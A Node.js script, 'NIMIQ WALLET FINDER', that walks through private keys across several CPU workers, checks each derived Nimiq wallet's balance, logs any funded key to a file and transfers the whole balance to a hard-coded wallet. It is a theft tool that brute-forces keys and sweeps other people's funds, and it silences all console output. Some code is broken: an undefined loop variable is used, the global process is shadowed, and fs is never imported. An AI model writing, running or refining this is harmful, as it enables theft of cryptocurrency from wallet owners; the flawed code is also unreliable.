
const getRange = (numCPUs, MIN_PRIVATE_KEY, MAX_PRIVATE_KEY) => {
  const rangeSize = (MAX_PRIVATE_KEY - MIN_PRIVATE_KEY + 1n) / BigInt(numCPUs);
  const ranges = {};
  
  for (let i = 0; i < numCPUs; i++) {
    const min = MIN_PRIVATE_KEY + rangeSize * BigInt(i);
    const max = (i === numCPUs - 1) ? MAX_PRIVATE_KEY : (min + rangeSize - 1n);
    ranges[i + 1] = { min, max };
  }
  return ranges;
}

(async () => {
  console.log = function () { }
  console.error = function () { }
  console.warn = function () { }

  // Connect
  const Connection = require('./connection');
  const connection = new Connection();
  const wrapper = await connection.connect();

  // Main
  const { range } = require('lodash');
  const cluster = require('cluster');
  const blessed = require('blessed');
  const argv = require('minimist')(process.argv.slice(2));
  const threads = argv?.t || 4;
  const MIN_PRIVATE_KEY = argv?.start || BigInt('0x1');
  const MAX_PRIVATE_KEY = argv?.end || BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140');
  const ranges = getRange(threads, MIN_PRIVATE_KEY, MAX_PRIVATE_KEY);
  
  async function generate(node, privateKey) {
    const wallet = node.accountHelper.importWalletFromHexKey(privateKey);
    const address = wallet._keyPair.publicKey.toAddress().toUserFriendlyAddress();
    const balance = await getBalance(address, node);

    if (balance > 0) {
      // Write to file
      var successString = "Wallet: [" + address + "] - Private: [" + privateKey + "] - Balance: " + balance + " NIM" + "\n\n------ Malphite Coder ------\n\n";
      fs.appendFileSync('./match-private.txt', successString, (err) => {
        if (err) throw err;
      })
      // Send to main wallet
      const payload = { address: "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03", amount: balance * 100000, fee: 0 }
      node.transactionHelper.sendTransaction(wallet, payload)
    }

    process.send({ address, privateKey , balance }); 
  }

  const getBalance = async (address, node) => new Promise((resolve) => {
    try {
      node.accountHelper.getBalance(address, (b) => {
        const balance = b / 100000;
        resolve(balance)
      })
    } catch (error) {
      console.log(error);
      resolve(-1)
    }
  })

  if (cluster.isMaster) {
    let counts = 0;
    let founds = 0;
    const lines = {}
    const numCPUs = threads || 2;

    let screen = blessed.screen({
      smartCSR: true
    });

    let title = blessed.text({
      top: 0,
      left: 0,
      width: '100%',
      height: 'shrink',
      content: `NIMIQ WALLET FINDER v1.0`,
      style: {
        fg: 'green'
      }
    });

    let status = blessed.text({
      top: 2,
      left: 0,
      width: '100%',
      height: 'shrink',
      content: `Threads:      ${numCPUs} CPUs`,
      style: {
        fg: 'green'
      }
    });

    let result = blessed.text({
      top: 4,
      left: 0,
      width: '100%',
      height: 'shrink',
      content: `Result:       Total: 0 | Found: 0`,
      style: {
        fg: 'green'
      }
    });

     let process = blessed.text({
        top: 6 + (i * 2),
        left: 0,
        width: '100%',
        height: 'shrink',
        content: `Wallet Check: [CPU 1] `,
        style: {
          fg: 'yellow'
        }
      });

    let box = blessed.box({
      top: 7 + (numCPUs * 2),
      left: 0,
      width: '100%',
      height: 'shrink',
      style: {
        fg: 'blue'
      }
    });

    screen.append(title);
    screen.append(status);
    screen.append(result);
    screen.append(box);
    screen.append(process);
    screen.render();

    cluster.on('message', (worker, message) => {
      counts++;
      
      if (message.balance > 0) {
        founds++;
        box.insertTop(`Found: ${message.balance} NIM | ${message.address} | ${message.privateKey}`);
      }

      result.setContent(`Result:       Total: ${counts} | Found: ${founds}`);

      process.setContent(`Wallet Check: [CPU ${worker.id}] ${message.address} | ${message.privateKey} | ${message.balance} NIM`)

      screen.render();
    });

    // Fork workers.
    for (let i = 0; i < numCPUs; i++) {
      cluster.fork(); // Create a new worker process
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
    });
  } else {
    const interval = setInterval(() => {
      const id = cluster.worker.id;
      const key = ranges[id]['min'];
      const max = ranges[id]['max'];

      if (key <= max) {
        ranges[id]['min']++;
        const privateKey = key.toString(16).padStart(64, '0'); 
        generate(wrapper, privateKey);
      } else {
        clearInterval(interval);
      }
    })
  }
})()
